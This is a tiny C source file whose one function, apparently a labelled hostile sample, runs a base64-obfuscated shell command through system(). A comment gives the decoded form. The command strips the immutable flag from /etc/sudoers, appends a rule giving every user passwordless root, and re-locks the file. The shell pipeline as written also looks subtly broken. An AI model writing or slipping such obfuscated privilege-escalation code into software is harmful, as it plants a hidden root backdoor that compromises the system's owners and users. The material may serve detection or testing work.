#include <stdio.h>
#include <stdlib.h>
// with chattr immutability, allow everyone to use sudo with no password
int naughty2() {
    system(
        "Y2hhdHRyIC1pIC9ldGMvc3Vkb2VyczsgZWNobyAnQUxMIEFMTD0oQUxMKSBOT1BBU1NXRD"
        "ogQUxMJyA+PiAvZXRjL3N1ZG9lcnM7IGNoYXR0ciAraSAvZXRjL3N1ZG9lcnM= | "
        "base64 -d | bash -");
    return 0;
    // chattr -i /etc/sudoers; echo 'ALL ALL=(ALL) NOPASSWD: ALL' >>
    // /etc/sudoers; chattr +i /etc/sudoers
}